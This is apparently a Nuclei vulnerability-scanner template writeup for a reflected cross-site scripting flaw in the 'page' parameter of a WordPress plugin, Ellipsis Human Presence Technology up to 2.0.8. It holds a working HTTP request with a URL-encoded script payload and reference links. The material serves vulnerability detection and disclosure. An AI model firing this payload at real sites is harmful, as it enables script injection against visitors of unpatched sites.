# Nuclei Template: Ellipsis Human Presence Technology <= 2.0.8 - Cross Site Scripting
**Template ID:** wp-ellipsis-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`wp-ellipsis-xss.yaml`)

## Vulnerability Information & PoC

## Description
The 'page' GET parameter of the inc/protected-forms-table.php file was affected by a reflected XSS vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET /wp-content/plugins/ellipsis-human-presence-technology/inc/protected-forms-table.php?&page=%22%20%3E%3Cscript%3Ealert(document.location)%3C/script%3E HTTP/1.1
Host: {{Hostname}}
```

## References
- https://wpscan.com/vulnerability/c0a138d8-93ac-463c-b650-d849352c0b44
- https://packetstormsecurity.com/files/154393/
- https://wordpress.org/plugins/ellipsis-human-presence-technology/
